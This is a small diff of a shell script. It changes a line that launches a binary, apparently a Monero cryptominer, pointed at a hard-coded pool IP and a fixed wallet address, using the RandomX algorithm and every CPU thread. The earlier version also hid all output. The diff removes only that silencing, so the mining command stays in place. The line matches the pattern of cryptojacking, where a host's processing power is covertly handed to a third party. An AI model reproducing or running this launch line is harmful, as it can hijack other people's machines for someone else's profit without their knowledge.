@@ -25,4 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -o 172.104.209.173:7568 -u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym/titos3 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 172.104.209.173:7568 -u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym/titos3 -a rx/0 -t $(nproc --all)
